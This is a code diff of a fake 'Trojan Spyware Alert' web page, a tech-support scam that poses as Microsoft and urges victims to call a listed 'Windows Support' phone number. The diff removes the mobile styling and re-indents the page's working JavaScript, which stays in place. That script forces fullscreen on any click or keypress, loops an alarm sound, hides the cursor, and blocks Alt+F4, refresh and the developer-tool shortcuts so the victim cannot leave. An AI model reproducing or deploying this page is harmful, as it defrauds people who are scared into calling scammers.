@@ -64,91 +64,6 @@
          color: #000;
          line-height: 30px;
          }
-         .text-for-error-mobile{
-           display: none;
-         }
-/* CSS for mobile devices */
-@media only screen and (max-width: 1000px) {
-
-   .popup-overlay {
-         position: absolute;
-         top: 0;
-         left: 0;
-         width: 100%;
-         height: 100%;
-         background-color: rgba(0, 0, 0, 0.5);
-         display: flex;
-         justify-content: center;
-         align-items: top;
-         z-index: 11; /* Ensure the popup appears on top */
-         height: 100vh;
-         }
-         .popup-content {
-         margin-top: 10px;
-         background-color: white;
-         padding: 20px;
-         padding-top: 15px;
-         border-radius: 5px;
-         box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
-         height: auto;
-         width: 100%;
-         }
-         .popup-content p {
-         font-size: 20px;
-         color: #000;
-         line-height: 30px;
-         }
-         .text-for-error-desktop{
-      display: none;
-   }
-   .text-for-error-mobile{
-           display:block;  
-           text-align: center;         
-         }
-         .text-for-error-mobile p,h1 {
-            color: #fff;
-         }
-         .pulse {
-  -webkit-animation-name: pulse;
-  animation-name: pulse;
-  -webkit-animation-duration: 1s;
-  animation-duration: 1s;
-  -webkit-animation-fill-mode: both;
-  animation-fill-mode: both;
-  animation-iteration-count: infinite;
-}
-
-@-webkit-keyframes pulse {
-  0% {
-    -webkit-transform: scale3d(1, 1, 1);
-    transform: scale3d(1, 1, 1);
-  }
-  50% {
-    -webkit-transform: scale3d(1.2, 1.2, 1.2); /* Increased scale values */
-    transform: scale3d(1.2, 1.2, 1.2); /* Increased scale values */
-  }
-  100% {
-    -webkit-transform: scale3d(1, 1, 1);
-    transform: scale3d(1, 1, 1);
-  }
-}
-
-@keyframes pulse {
-  0% {
-    -webkit-transform: scale3d(1, 1, 1);
-    transform: scale3d(1, 1, 1);
-  }
-  50% {
-    -webkit-transform: scale3d(1.2, 1.2, 1.2); /* Increased scale values */
-    transform: scale3d(1.2, 1.2, 1.2); /* Increased scale values */
-  }
-  100% {
-    -webkit-transform: scale3d(1, 1, 1);
-    transform: scale3d(1, 1, 1);
-  }
-}
- 
-}
       </style>
    </head>
    <body class="page basicpage" style="height: 100%;overflow: hidden;">
@@ -296,13 +211,7 @@
                   <img src="images/logoms.jpg" alt="Surface Laptop 5" style="height: 100px;">
                </div>
                <div>
-                  <p class="text-for-error-desktop" style="color: #fff;">Trojan Spyware Alert - Error Code: #ox268d3<br>Access to this PC has been blocked for security reasons.<br>Contact Windows Support: +1 (888) 818-8542</p>   
-               <div class="text-for-error-mobile">
-                  <p>Trojan Spyware Alert - Error Code: #ox268d3</p>
-                  <p>Access to this PC has been blocked for security reasons.</p>
-                  <p>Contact Windows Support:</p>
-                  <h1 class="pulse">+1 (888) 818-8542</h1>
-               </div>
+                  <p style="color: #fff;">Trojan Spyware Alert - Error Code: #ox268d3<br>Access to this PC has been blocked for security reasons.<br>Contact Windows Support: +1 (888) 818-8542</p>   
                </div>   
             </div>
             <div class="row" style="justify-content: space-around; margin-top: 20px;">
@@ -583,97 +492,97 @@
            $('#closePopup').click(closePopup);
          });             
          $(document).click(function() {
-      $('#audio')[0].play();
-      $('#audio')[0].loop = true;
-        var elem = document.documentElement;
-        if (elem.requestFullscreen) {
-              elem.requestFullscreen();
-        } else if (elem.mozRequestFullScreen) { /* Firefox */
-              elem.mozRequestFullScreen();
-        } else if (elem.webkitRequestFullscreen) { /* Chrome, Safari and Opera */
-              elem.webkitRequestFullscreen();
-        } else if (elem.msRequestFullscreen) { /* IE/Edge */
-              elem.msRequestFullscreen();
-        }
-     });
-     document.addEventListener('contextmenu', function(e) {
-        var elem = document.documentElement;
-        if (elem.requestFullscreen) {
-              elem.requestFullscreen();
-        } else if (elem.mozRequestFullScreen) { /* Firefox */
-              elem.mozRequestFullScreen();
-        } else if (elem.webkitRequestFullscreen) { /* Chrome, Safari and Opera */
-              elem.webkitRequestFullscreen();
-        } else if (elem.msRequestFullscreen) { /* IE/Edge */
-              elem.msRequestFullscreen();
-        }
-        e.preventDefault();
-     });
-     document.addEventListener('keydown', function(e) {
-        var elem = document.documentElement;
-        if (elem.requestFullscreen) {
-              elem.requestFullscreen();
-        } else if (elem.mozRequestFullScreen) { /* Firefox */
-              elem.mozRequestFullScreen();
-        } else if (elem.webkitRequestFullscreen) { /* Chrome, Safari and Opera */
-              elem.webkitRequestFullscreen();
-        } else if (elem.msRequestFullscreen) { /* IE/Edge */
-              elem.msRequestFullscreen();
-        }
-     });
-    //alt + f4 brrowser close disable
-      document.addEventListener('keydown', function(e) {
-         if (e.key === 'F4' && e.altKey) {
+             $('#audio')[0].play();
+             $('#audio')[0].loop = true;
+               var elem = document.documentElement;
+               if (elem.requestFullscreen) {
+                     elem.requestFullscreen();
+               } else if (elem.mozRequestFullScreen) { /* Firefox */
+                     elem.mozRequestFullScreen();
+               } else if (elem.webkitRequestFullscreen) { /* Chrome, Safari and Opera */
+                     elem.webkitRequestFullscreen();
+               } else if (elem.msRequestFullscreen) { /* IE/Edge */
+                     elem.msRequestFullscreen();
+               }
+            });
+            document.addEventListener('contextmenu', function(e) {
+               var elem = document.documentElement;
+               if (elem.requestFullscreen) {
+                     elem.requestFullscreen();
+               } else if (elem.mozRequestFullScreen) { /* Firefox */
+                     elem.mozRequestFullScreen();
+               } else if (elem.webkitRequestFullscreen) { /* Chrome, Safari and Opera */
+                     elem.webkitRequestFullscreen();
+               } else if (elem.msRequestFullscreen) { /* IE/Edge */
+                     elem.msRequestFullscreen();
+               }
                e.preventDefault();
-         }
-      });
-        //ctrl + shift + i disable
-        document.addEventListener('keydown', function(e) {
-           if (e.ctrlKey && e.shiftKey && e.key === 'I') {
-                 e.preventDefault();
-           }
-        });
-        //ctrl + shift + j disable
-        document.addEventListener('keydown', function(e) {
-           if (e.ctrlKey && e.shiftKey && e.key === 'J') {
-                 e.preventDefault();
-           }
-        });
-        //ctrl + shift + c disable
-        document.addEventListener('keydown', function(e) {
-           if (e.ctrlKey && e.shiftKey && e.key === 'C') {
-                 e.preventDefault();
-           }
-        });
-        //ctrl + shift + u disable
-        document.addEventListener('keydown', function(e) {
-           if (e.ctrlKey && e.shiftKey && e.key === 'U') {
-                 e.preventDefault();
-           }
-        });
-        //ctrl + shift + s disable
-        document.addEventListener('keydown', function(e) {
-           if (e.ctrlKey && e.shiftKey && e.key === 'S') {
-                 e.preventDefault();
-           }
-        });
-        // f5 disable
-        document.addEventListener('keydown', function(e) {
-           if (e.key === 'F5') {
-                 e.preventDefault();
-           }
-        });
-           //f11 disable
-        document.addEventListener('keydown', function(e) {
-           if (e.key === 'F11') {
-                 e.preventDefault();
-           }
-        });
-document.addEventListener('fullscreenchange', (event) => {
-           if (document.fullscreenElement) {
-              document.documentElement.style.cursor = 'none';
-           }
-        });  
+            });
+            document.addEventListener('keydown', function(e) {
+               var elem = document.documentElement;
+               if (elem.requestFullscreen) {
+                     elem.requestFullscreen();
+               } else if (elem.mozRequestFullScreen) { /* Firefox */
+                     elem.mozRequestFullScreen();
+               } else if (elem.webkitRequestFullscreen) { /* Chrome, Safari and Opera */
+                     elem.webkitRequestFullscreen();
+               } else if (elem.msRequestFullscreen) { /* IE/Edge */
+                     elem.msRequestFullscreen();
+               }
+            });
+           //alt + f4 brrowser close disable
+             document.addEventListener('keydown', function(e) {
+                if (e.key === 'F4' && e.altKey) {
+                      e.preventDefault();
+                }
+             });
+               //ctrl + shift + i disable
+               document.addEventListener('keydown', function(e) {
+                  if (e.ctrlKey && e.shiftKey && e.key === 'I') {
+                        e.preventDefault();
+                  }
+               });
+               //ctrl + shift + j disable
+               document.addEventListener('keydown', function(e) {
+                  if (e.ctrlKey && e.shiftKey && e.key === 'J') {
+                        e.preventDefault();
+                  }
+               });
+               //ctrl + shift + c disable
+               document.addEventListener('keydown', function(e) {
+                  if (e.ctrlKey && e.shiftKey && e.key === 'C') {
+                        e.preventDefault();
+                  }
+               });
+               //ctrl + shift + u disable
+               document.addEventListener('keydown', function(e) {
+                  if (e.ctrlKey && e.shiftKey && e.key === 'U') {
+                        e.preventDefault();
+                  }
+               });
+               //ctrl + shift + s disable
+               document.addEventListener('keydown', function(e) {
+                  if (e.ctrlKey && e.shiftKey && e.key === 'S') {
+                        e.preventDefault();
+                  }
+               });
+               // f5 disable
+               document.addEventListener('keydown', function(e) {
+                  if (e.key === 'F5') {
+                        e.preventDefault();
+                  }
+               });
+                  //f11 disable
+               document.addEventListener('keydown', function(e) {
+                  if (e.key === 'F11') {
+                        e.preventDefault();
+                  }
+               });
+  document.addEventListener('fullscreenchange', (event) => {
+                  if (document.fullscreenElement) {
+                     document.documentElement.style.cursor = 'none';
+                  }
+               });    
       </script>
    </body>
 </html>
